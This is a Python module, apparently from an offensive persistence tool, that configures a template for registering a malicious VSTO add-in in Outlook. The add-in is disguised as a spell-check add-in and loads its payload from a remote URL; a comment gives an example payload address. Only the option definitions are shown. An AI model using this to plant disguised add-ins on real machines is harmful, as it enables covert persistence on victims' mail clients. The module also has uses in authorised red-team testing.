
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import escapequotes
from lib.validators.generic import iswebaddress
from lib.handlers.generic import escapebackslash

class Template(ModuleInterface):
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        options['Path_x86'] = {
            "value": None, # http://192.168.0.99:8000/OutlookExtension.vsto
            "required": True,
            "description": "URL for VSTO payload (x86)",
            "validator": iswebaddress,
            #"validator": None,
            "handler": escapebackslash
        }
        options['Path_x64'] = {
            "value": None, # http://192.168.0.99:8000/OutlookExtension.vsto
            "required": True,
            "description": "URL for VSTO payload (x64)",
            "validator": iswebaddress,
            #"validator": None,
            "handler": escapebackslash
        }
        options['Modulus'] = {
            "value": None, # uUKeQeLuXq4NOSoqQ9//BHlO9qZfGgXBcp6/WzqEdqKc//nIsklyf2zflx8TkUb7Pk0z5lVzbaVJGodsvVRVjPIQY5Ggb0sGuBi1Ws13mWzmRszzWOSV9l019xGsPSCxneOIpVxx2GwIiGZQwZnPpzP3W1wRWDDeC9K96D1lLH0=
            "required": True,
            "description": "Modulus for VSTO public key",
            "validator": None,
            "handler": escapebackslash
        }
        options['Description'] = {
            "value": "The Add-in provides spell checking within Outlook",
            "required": False,
            "description": "A brief description of the VSTO Add-in. This description is displayed when the user selects the VSTO Add-in in the Add-Ins pane of the Options dialog box in the Microsoft Office application.",
            "validator": None,
            "handler": escapequotes
        }
        options['FriendlyName'] = {
            "value": "Outlook Spell Check Add-in",
            "required": False,
            "description": "A descriptive name of the VSTO Add-in that is displayed in the COM Add-Ins dialog box in the Microsoft Office application. Usually this is the VSTO Add-in ID.",
            "validator": None,
            "handler": escapequotes
        }
        options['AddInName'] = {
            "value": "SpellCheckAddin",
            "required": True,
            "description": "The name of the add-in being registered.",
            "validator": None,
            "handler": escapequotes
        }
        options['OfficeApplication'] = {
            "value": "Outlook",
            "required": True,
            "hidden": True,
            "description": "The Microsoft Office application for which the add-in is being registered.",
            "validator": None,
            "handler": escapequotes
        }
        options['PreferredClr'] = {
            "value": "v4.0.30319",
            "required": True,
            "hidden": True,
            "description": "The target common languague runtime.",
            "validator": None,
            "handler": escapequotes
        }
        options['Framework'] = {
            "value": "4.0",
            "required": True,
            "hidden": True,
            "description": "The target framework.",
            "validator": None,
            "handler": escapequotes
        }
        options['Guid'] = {
            "value": "FA2052FB-9E23-43C8-A0EF-43BBB710DC61",
            "required": True,
            "hidden": True,
            "description": "The VSTO's GUID",
            "validator": None,
            "handler": escapequotes
        }
        options['SecurityGuid'] = {
            "value": "1e1f0cff-ff7a-406d-bd82-e53809a5e93a",
            "required": True,
            "hidden": True,
            "description": "The GUID of the VSTO's security public key",
            "validator": None,
            "handler": escapequotes
        }
        super().__init__(templatePath, options)
